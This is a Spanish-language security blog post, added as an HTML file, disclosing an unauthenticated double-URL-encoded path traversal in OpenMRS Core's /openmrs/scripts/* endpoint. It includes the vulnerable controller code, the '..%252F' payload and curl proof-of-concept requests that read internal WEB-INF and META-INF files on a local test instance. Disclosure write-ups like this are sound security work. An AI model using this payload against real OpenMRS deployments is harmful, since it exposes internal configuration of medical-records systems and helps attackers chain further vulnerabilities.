@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>OpenMRS: path traversal doblemente codificado | ZsZsec</title>
+  <meta name="description" content="Investigación local sobre una divulgación no autenticada de archivos internos en el dispatcher de contenido estático de OpenMRS." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/openmrs-double-encoded-path-traversal-file-disclosure.html" />
+  <meta property="og:title" content="OpenMRS: path traversal doblemente codificado" />
+  <meta property="og:description" content="Investigación sobre una divulgación no autenticada de archivos internos en OpenMRS." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/openmrs-double-encoded-path-traversal-file-disclosure.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="OpenMRS: path traversal doblemente codificado" />
+  <meta name="twitter:description" content="Path traversal no autenticado con divulgación de archivos internos en OpenMRS." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">security research / openmrs</p>
+      <h1>Static content path traversal<span>_</span></h1>
+      <div class="writeup-meta"><span>High</span><span>Path traversal / File disclosure</span><span>No response</span></div>
+      <div class="tag-row"><span class="tag">OpenMRS</span><span class="tag">Path Traversal</span><span class="tag">File Disclosure</span><span class="tag">Spring MVC</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <blockquote><p><strong>Alcance:</strong> la validación se realizó contra OpenMRS Core en un despliegue Docker Compose local. El hallazgo fue reportado previamente mediante GitHub Security Advisory como <code>GHSA-qp2w-pqvj-4g33</code> y posteriormente seguido por email. El maintainer no respondió y no se asignó CVE.</p></blockquote>
+
+        <p>Durante la revisión de OpenMRS Core encontré una vulnerabilidad de path traversal no autenticada en el dispatcher de contenido estático. El fallo permitía a un atacante remoto leer archivos internos empaquetados dentro del archivo WAR de la aplicación web.</p>
+
+        <p>El problema afectaba a la ruta <code>/openmrs/scripts/*</code>. Mediante secuencias de traversal doblemente codificadas era posible escapar del directorio previsto para scripts y recuperar archivos como <code>/WEB-INF/web.xml</code>, <code>/WEB-INF/openmrs_static_content-servlet.xml</code>, <code>/WEB-INF/csrfguard.properties</code> y <code>/META-INF/context.xml</code>.</p>
+
+        <p>El impacto confirmado se limita a divulgación de archivos internos de la aplicación web. No confirmé lectura arbitraria del filesystem del sistema operativo, escritura de archivos, bypass de autenticación ni ejecución remota de código.</p>
+
+        <h2>Ficha técnica</h2>
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Proyecto</td><td>OpenMRS Core</td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/openmrs/openmrs-core" target="_blank" rel="noopener noreferrer">github.com/openmrs/openmrs-core</a></td></tr>
+            <tr><td>Reporte enviado</td><td>19 de julio de 2026</td></tr>
+            <tr><td>Componente</td><td><code>org.openmrs.web:openmrs-webapp</code></td></tr>
+            <tr><td>Versión probada</td><td><code>3.0.0-SNAPSHOT</code></td></tr>
+            <tr><td>Endpoint</td><td><code>/openmrs/scripts/*</code></td></tr>
+            <tr><td>Autenticación</td><td>No requerida</td></tr>
+            <tr><td>Vulnerabilidad</td><td>Double URL encoded path traversal</td></tr>
+            <tr><td>Severidad estimada</td><td>High · CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)</td></tr>
+            <tr><td>Impacto</td><td>Internal web application file disclosure</td></tr>
+            <tr><td>GHSA</td><td><code>GHSA-qp2w-pqvj-4g33</code></td></tr>
+            <tr><td>CVE</td><td>No asignado</td></tr>
+            <tr><td>Estado</td><td>No response / follow-up por email</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Flujo vulnerable</h2>
+        <p>La ruta <code>/scripts/*</code> estaba mapeada al servlet <code>openmrs_static_content</code> en:</p>
+        <pre><code>webapp/src/main/webapp/WEB-INF/web.xml</code></pre>
+
+        <p>El servlet estaba configurado para enviar las solicitudes a <code>staticResourceDispatcher</code> mediante:</p>
+        <pre><code>webapp/src/main/webapp/WEB-INF/openmrs_static_content-servlet.xml</code></pre>
+
+        <p>El mismo contexto de servlet utilizaba un <code>InternalResourceViewResolver</code> con <code>/WEB-INF/view</code> como ruta base y un sufijo vacío. El path de la solicitud terminaba siendo procesado por:</p>
+        <pre><code>web/src/main/java/org/openmrs/web/controller/PseudoStaticContentController.java</code></pre>
+
+        <pre><code>String path = request.getServletPath() + request.getPathInfo();
+
+if (rewrites != null &amp;&amp; rewrites.containsKey(path)) {
+    path = rewrites.get(path);
+}
+if (interpretJstl) {
+    path += ".withjstl";
+}
+
+return new ModelAndView(path);</code></pre>
+
+        <p>El path controlado por la solicitud se devolvía como <code>ModelAndView</code> sin canonicalización ni validación que garantizara que el recurso final permaneciera bajo <code>/WEB-INF/view/scripts/</code>.</p>
+
+        <h2>Double URL encoding</h2>
+        <p>Una solicitud como la siguiente utilizaba dos niveles de codificación para que la secuencia de traversal sobreviviera al primer procesamiento:</p>
+        <pre><code>/openmrs/scripts/..%252F..%252Fweb.xml</code></pre>
+
+        <p>La ruta terminaba resolviéndose como un recurso interno equivalente a:</p>
+        <pre><code>/WEB-INF/view/scripts/../../web.xml</code></pre>
+
+        <p>El resultado era la lectura de:</p>
+        <pre><code>/WEB-INF/web.xml</code></pre>
+
+        <p>El mismo comportamiento permitía alcanzar otros recursos del WAR bajo <code>/WEB-INF</code> y <code>/META-INF</code>.</p>
+
+        <h2>Prueba de concepto local</h2>
+        <p>La prueba se realizó contra OpenMRS Core en la configuración Docker Compose del proyecto. No se requirió autenticación.</p>
+
+        <h3>1. Lectura de web.xml</h3>
+        <pre><code>curl --path-as-is -i \
+  'http://localhost:8080/openmrs/scripts/..%252F..%252Fweb.xml'</code></pre>
+
+        <p>La respuesta observada fue:</p>
+        <pre><code>HTTP/1.1 200
+Content-Type: application/xml;charset=UTF-8
+Content-Length: 12880</code></pre>
+
+        <p>El body contenía el descriptor interno de la aplicación web:</p>
+        <pre><code>&lt;web-app xmlns="https://jakarta.ee/xml/ns/jakartaee" ...&gt;
+    &lt;display-name&gt;OpenMRS&lt;/display-name&gt;
+    &lt;description&gt;An Open-Source EMR System&lt;/description&gt;
+    ...
+&lt;/web-app&gt;</code></pre>
+
+        <p><strong>Resultado:</strong> el payload doblemente codificado devolvía <code>HTTP 200</code> y exponía el archivo interno <code>/WEB-INF/web.xml</code>.</p>
+
+        <h3>2. Lectura de configuración de CSRFGuard</h3>
+        <pre><code>curl --path-as-is -i \
+  'http://localhost:8080/openmrs/scripts/..%252F..%252Fcsrfguard.properties'</code></pre>
+
+        <p>La respuesta observada fue:</p>
+        <pre><code>HTTP/1.1 200
+Content-Length: 34113</code></pre>
+
+        <p>El contenido devuelto correspondía al archivo interno <code>/WEB-INF/csrfguard.properties</code>, confirmando que la exposición no estaba limitada a un único descriptor.</p>
+
+        <h2>Archivos confirmados</h2>
+        <ul>
+          <li><code>/WEB-INF/web.xml</code></li>
+          <li><code>/WEB-INF/openmrs_static_content-servlet.xml</code></li>
+          <li><code>/WEB-INF/csrfguard.properties</code></li>
+          <li><code>/WEB-INF/csrfguard.js</code></li>
+          <li><code>/META-INF/context.xml</code></li>
+          <li><code>/META-INF/MANIFEST.MF</code></li>
+        </ul>
+
+        <h2>Impacto</h2>
+        <p>Un atacante remoto no autenticado podía leer archivos internos del archivo WAR desplegado. Estos archivos exponían detalles de la estructura de la aplicación y de sus controles de seguridad:</p>
+        <ul>
+          <li>Mapeos de servlets y filtros.</li>
+          <li>Configuración de Spring MVC.</li>
+          <li>Configuración de CSRFGuard.</li>
+          <li>Configuración del contexto de Tomcat.</li>
+          <li>Rutas internas y metadatos de build y versión.</li>
+        </ul>
+
+        <p>La información puede ayudar a comprender la arquitectura interna y facilitar el encadenamiento con otras vulnerabilidades. En esta investigación no confirmé lectura arbitraria de archivos del sistema, escritura, bypass de autenticación ni RCE.</p>
+
+        <h2>Divulgación responsable</h2>
+        <p>El problema fue reportado previamente mediante GitHub Security Advisory con el identificador <code>GHSA-qp2w-pqvj-4g33</code>. Posteriormente envié un seguimiento por email al equipo de seguridad de OpenMRS por si el advisory había sido omitido o requería información adicional.</p>
+
+        <h2>Estado</h2>
+        <p>El maintainer no respondió y no se asignó CVE. Esta investigación se publica con datos sintéticos y documenta únicamente una instancia de prueba controlada.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
